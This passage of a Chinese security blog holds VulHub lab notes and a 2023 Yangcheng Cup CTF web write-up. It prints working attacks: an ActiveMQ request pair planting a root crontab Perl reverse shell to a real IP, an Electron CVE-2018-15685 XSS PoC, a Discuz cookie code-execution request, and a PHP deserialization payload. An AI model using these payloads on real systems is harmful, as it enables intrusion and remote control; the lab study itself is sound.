src="/2024/03/30/VulHub%E9%9D%B6%E5%9C%BA%E7%A7%AF%E7%B4%AF/image-20240330194855867.png" alt="image-20240330194855867"></p><h5 id="用户级别crontab"><a href="#用户级别crontab" class="headerlink" title="用户级别crontab"></a>用户级别crontab</h5><p>​    上传同上，</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/fileserver/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8161</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>247</span><br><span class="line"></span><br><span class="line"><span class="language-tcl">*/<span class="number">1</span> * * * * /usr/bin/perl -e &#x27;use Socket;<span class="variable">$i</span>=<span class="string">&quot;183.136.206.184&quot;</span>;<span class="variable">$p</span>=<span class="number">42321</span>;<span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">&quot;tcp&quot;</span>));<span class="keyword">if</span>(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;<span class="keyword">open</span>(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;</span></span><br><span class="line"><span class="language-tcl"></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///var/spool/cron/crontabs/root</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8161</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure><p>​    等待反弹，需要等久点，任务计划会定期扫描，刚写进去不一定能生效。</p><p><img src="/2024/03/30/VulHub%E9%9D%B6%E5%9C%BA%E7%A7%AF%E7%B4%AF/image-20240330195319832.png" alt="image-20240330195319832"></p><h1 id="Electron"><a href="#Electron" class="headerlink" title="Electron"></a>Electron</h1><p>Electron是由Github开发，用HTML，CSS和JavaScript来构建跨平台桌面应用程序的一个开源库。 Electron通过将Chromium和Node.js合并到同一个运行时环境中，并将其打包为Mac，Windows和Linux系统下的应用来实现这一目的。</p><h2 id="Electron-WebPreferences-远程命令执行漏洞（CVE-2018-15685）"><a href="#Electron-WebPreferences-远程命令执行漏洞（CVE-2018-15685）" class="headerlink" title="Electron WebPreferences 远程命令执行漏洞（CVE-2018-15685）"></a>Electron WebPreferences 远程命令执行漏洞（CVE-2018-15685）</h2><blockquote><p>Electron在设置了<code>nodeIntegration=false</code>的情况下（默认），页面中的JavaScript无法访问node.js的内置库。CVE-2018-15685绕过了该限制，导致在用户可执行JavaScript的情况下（如访问第三方页面或APP存在XSS漏洞时），能够执行任意命令。</p></blockquote><p>POC:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=&quot;window.open().open(&#x27;data:text/html,&lt;script&gt;require(\&#x27;child_process\&#x27;).exec(\&#x27;calc.exe\&#x27;)&lt;/script&gt;&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><h1 id="Discuz"><a href="#Discuz" class="headerlink" title="Discuz"></a>Discuz</h1><p><em>Discuz</em>开源社交建站系统，超过300万站长使用，全球成熟度最高、覆盖率最大的建站系统之一</p><h2 id="Discuz-7-x-6-x-全局变量防御绕过导致代码执行"><a href="#Discuz-7-x-6-x-全局变量防御绕过导致代码执行" class="headerlink" title="Discuz 7.x/6.x 全局变量防御绕过导致代码执行"></a>Discuz 7.x/6.x 全局变量防御绕过导致代码执行</h2><p>由于php5.3.x版本里php.ini的设置里<code>request_order</code>默认值为GP，导致<code>$_REQUEST</code>中不再包含<code>$_COOKIE</code>，我们通过在Cookie中传入<code>$GLOBALS</code>来覆盖全局变量，造成代码执行漏洞。</p><p>具体原理请参考：</p><ul><li><a href="https://www.secpulse.com/archives/2338.html">https://www.secpulse.com/archives/2338.html</a></li></ul><h4 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>执行如下命令启动Discuz 7.2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>启动后，访问<code>http://your-ip:8080/install/</code>来安装discuz，数据库地址填写<code>db</code>，数据库名为<code>discuz</code>，数据库账号密码均为<code>root</code>。</p><p><img src="/2024/03/30/VulHub%E9%9D%B6%E5%9C%BA%E7%A7%AF%E7%B4%AF/1.png" alt="img"></p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>安装成功后，直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加<code>GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /viewthread.php?tid=10&amp;extra=page%3D1 HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>可见，phpinfo已成功执行：</p><p><img src="https://vulhub.org/vulhub/discuz/wooyun-2010-080723/2.png" alt="img"></p><blockquote><p>网上文章说需要一个带表情评论的帖子，实际测试发现并不需要，这块仍需阅读代码来解释原因。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 知识学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023羊城杯webwp</title>
      <link href="/2023/09/05/2023%E7%BE%8A%E5%9F%8E%E6%9D%AFwebwp/"/>
      <url>/2023/09/05/2023%E7%BE%8A%E5%9F%8E%E6%9D%AFwebwp/</url>
      
        <content type="html"><![CDATA[<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>首先是php源码development环境源码泄露，分别拿到start.sh(dirsearch扫出来的)和p0p.php的源码</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230902204727657.png" alt="image-20230902204727657"></p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230902204754321.png" alt="image-20230902204754321"></p><p>然后根据源码稍微下修改下，在自己本地搭建测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// header(&quot;HTTP/1.1 302 found&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// header(&quot;Location:https://passer-by.com/pacman/&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pro</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exp</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$rce2</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$rce2</span>=<span class="variable language_">$this</span>-&gt;exp[<span class="variable">$rce2</span>];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;system&#x27;</span>, <span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$ary</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="literal">true</span> || <span class="variable language_">$this</span>-&gt;finish1-&gt;name) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;finish-&gt;finish) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Yang::__call &quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">var_dump</span>(<span class="variable">$ary</span>);</span><br><span class="line">                <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;now[<span class="variable">$name</span>], <span class="variable">$ary</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ycb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Yang::ycb &quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;now = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;finish-&gt;finish;</span><br><span class="line">        <span class="comment">// var_dump($a);</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = True;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$finish</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Cheng::__get &quot;</span>;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;name[<span class="variable">$value</span>];</span><br><span class="line">        <span class="comment">// var_dump($value,$ret);</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;CTF-&gt;<span class="title function_ invoke__">ycb</span>()) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Bei::__destruct inif&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;fine-&gt;<span class="title function_ invoke__">YCB1</span>(<span class="variable">$this</span>-&gt;rce, <span class="variable">$this</span>-&gt;rce1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bei::__destruct -&gt; Yang::call()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prohib</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&quot;CTF&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//   unserialize(prohib($a));</span></span><br><span class="line">  <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行链条 <code>Bei::__destruct -&gt; Yang::__call()</code> 然后利用Cheng进行条件判断</p><p>最终payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// header(&quot;HTTP/1.1 302 found&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// header(&quot;Location:https://passer-by.com/pacman/&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pro</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exp</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$rce2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;exp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rce2 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yang</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cheng</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$finish</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;finish = <span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name[<span class="string">&quot;finish&quot;</span>] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bei</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prohib</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Bei</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;key = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;CTF = <span class="keyword">new</span> <span class="title class_">Yang</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;CTF-&gt;finish = <span class="keyword">new</span> <span class="title class_">Cheng</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;fine = <span class="keyword">new</span> <span class="title class_">Yang</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;fine-&gt;finish = <span class="keyword">new</span> <span class="title class_">Cheng</span>;</span><br><span class="line"><span class="comment">// $a-&gt;fine-&gt;now[&quot;YCB1&quot;] = &quot;assert&quot;;</span></span><br><span class="line"><span class="comment">// $a-&gt;rce = &quot;echo `\$_POST[cmd]`&quot;;</span></span><br><span class="line"><span class="variable">$a</span>-&gt;fine-&gt;now[<span class="string">&quot;YCB1&quot;</span>] = <span class="string">&quot;readfile&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;rce = <span class="string">&quot;php://filter/convert.base64-encode/resource=/proc/1/environ&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;rce1 = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="comment">// $a-&gt;CTF-&gt;now = 0;</span></span><br><span class="line"><span class="comment">// $a-&gt;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF=O%3A3%3A%22Bei%22%3A5%3A%7Bs%3A3%3A%22key%22%3Bb%3A0%3Bs%3A3%3A%22CTF%22%3BO%3A4%3A%22Yang%22%3A1%3A%7Bs%3A6%3A%22finish%22%3BO%3A5%3A%22Cheng%22%3A2%3A%7Bs%3A13%3A%22%00Cheng%00finish%22%3Bi%3A1%3Bs%3A4%3A%22name%22%3Ba%3A1%3A%7Bs%3A6%3A%22finish%22%3Bb%3A1%3B%7D%7D%7Ds%3A4%3A%22fine%22%3BO%3A4%3A%22Yang%22%3A2%3A%7Bs%3A6%3A%22finish%22%3BO%3A5%3A%22Cheng%22%3A2%3A%7Bs%3A13%3A%22%00Cheng%00finish%22%3Bi%3A1%3Bs%3A4%3A%22name%22%3Ba%3A1%3A%7Bs%3A6%3A%22finish%22%3Bb%3A1%3B%7D%7Ds%3A3%3A%22now%22%3Ba%3A1%3A%7Bs%3A4%3A%22YCB1%22%3Bs%3A8%3A%22readfile%22%3B%7D%7Ds%3A3%3A%22rce%22%3Bs%3A59%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fproc%2F1%2Fenviron%22%3Bs%3A4%3A%22rce1%22%3Bs%3A1%3A%221%22%3B%7D</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230902205702430.png" alt="image-20230902205702430"></p><p>然后base64解码得到flag</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230902205740263.png" alt="image-20230902205740263"></p><p>DASCTF{29196943047249369343892607212394}</p><p>当然还可以还可以进行双写绕过，加修改字符串长度达到RCE功能。</p><h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>首先拿到源码进行审计，分析两个有用的路由</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/templating&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">templating</span><span class="params">(<span class="meta">@RequestParam</span> String name, Model model)</span> &#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;name&quot;</span>, name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/getflag&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getflag</span><span class="params">(<span class="meta">@RequestParam</span> String data)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] decode = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        byteArrayOutputStream.write(decode);</span><br><span class="line">        <span class="type">NewObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NewObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Success&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先是/templating，返回根据index进行模板渲染，</p><p>然后是/getflag，传入data进行反序列化</p><p>看到Utils里面的HtmlInvocationHandler类，这是一个用于代理的类，重点在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span 